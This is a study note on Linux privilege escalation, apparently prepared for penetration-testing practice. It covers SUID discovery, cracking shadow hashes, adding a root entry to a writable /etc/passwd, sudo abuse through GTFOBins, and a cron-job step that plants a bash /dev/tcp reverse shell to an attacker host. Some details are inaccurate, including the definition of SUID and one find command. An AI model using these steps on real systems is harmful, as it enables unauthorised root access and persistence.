# Privledge Escalation (Linux)
## Definitions
- **Privilege escalation:** the process of increasing your account permissions to gain unauthorised access to resources. Privilege escalation allows up to:
	- Access resources and documents
	- Change system configurations
	- Establish persistence to access the machine later
	- Etc.
- **Horizontal escalation:** the process of getting access to a different account with the same permissions.
- **SUID (Set user ID) binary:** permissions set for a file (read/write/execute).
	- Permissions are indicated using a single letter and have a corresponding numeral value:
		- r = read = 4
		- w = write = 2
		- x = execute = 1
	- The maximum number of bits that can be used to set permission for each user is 7, which is a combination of read (4), write (2), and execute (1) operations.
	- cmd `find / -perm -u=s -type f 2>/dev/null` can be used to find SUID binaries within a file system
		- `find`- Initiates the "find" command  
		- `/` - Searches the whole file system  
		- `-perm` - searches for files with specific permissions  
		- `-u=s` - Any of the permission bits _mode_ are set for the file. Symbolic modes are accepted in this form
		- `-type f` - Only search for files  
		- `2>/dev/null` - Suppresses errors
- **/etc/passwd:** is a plain text file where essential login information is stored. Lists the system's user account info including user ID, group ID, home directory, shell, and more.
	- An entry looks as follows: `test:x:0:0:root:/root:/bin/bash`
		- The colon `:` symbol is used to separate different fields
		- Username
		- Password - indicated by the `x`
		- User ID (UID) - Every user is assigned an ID
			- 0 ; root
			- 1 - 99 ; predefined accounts
			- 100 - 999 ; system or administrative and system accounts/groups
		- Group ID (GID) - primary group ID (stored in /etc/group file)
		- User ID Info - comment feild can be used to add additional info such as full name and contact info
		- Home directory - the absolute path to the user's home directory
		- Command/shell - the absolute path of a command or shell

## Exploiting SUID/GUID Files
In Linux, SUID gives temporary permissions to a user to run the program/file with the permission of the file owner.
Instead of rwxrwxrwx -> rwSrwSrwx
==rwS==rwxrwx - **SUID** - User executes the file with permissions of the *file owner*
rwx==rwS==rwx - **SGID** - User executes the file with the permission of the *group owner.*
1) check for files with the SUID/GUID bit set 
	`find / -perm -u=s -type f 2>/dev/null`
	`find / -user root -perm -4000 print 2>/dev/null`
	`find / -user root -perm -4000 -exec ls -ldb {} \;`
2) Look for any files that look out of the ordinary
3) run the binary via file path

## Exploiting /etc/passwd
### Cracking password hashes
Access the root user account by cracking the root password hash
1)  Copy password hash from `/etc/shadow` to file on a personal machine
2) Crack hash with hashcat or john

### Writing to /etc/passwd
Writing to the **/etc/passwd** file should be limited to a superuser or root account. Suppose a regular user account has writable permissions to the file. In that case, we can exploit that vulnerability to create a root user.

If we have to write permissions to the /etc/passwd file, we can write a new entry and create a root account by setting the UID, GID, and shell to root, allowing us to log in as our root user.

1) First, create a password hash to add to the new account:
	`openssl passwd -1 -salt <salt> <password>`
	or
	`openssl passwd <New Password>`
2) Add your new user by editing the **/etc/passwd** file (`nano /etc/passwd`)  and the following user format:
	 `<username>:<hashedPassword>:0:0:root:/root:/bin/bash`
3) Login as your new root user `su <username>`

## Exploiting sudo
There are multiple programs that we can exploit for privilege escalation as long as we can run them with `sudo`
1) List the programs that the user is allowed to run with sudo:
	`sudo -l`
2) Search [GTFOBins](https://gtfobins.github.io/) for each program to see if any are exploitable

## Exploiting Cron Jobs
Cron jobs are scripts that are scheduled to run on the system at a specific time or interval. We can view available cron jobs via `/etc/crontab` and exploit the ones we can write to.
1) read crontab: `cat /etc/crontab`
2) find files on the system `locate exampleCronJob.sh`
3) Check to see if we can write to it: 
	`ls -l /filepath/exampleCronJob.sh`
4) add to script to connect to a personal computer:
	```
	#!/bin/bash  
	bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
	```
5) Set up Netcat listener and wait for the script to run: `nc -nvlp <LPORT>`



## Other Resources
- https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html
- https://payatu.com/guide-linux-privilege-escalation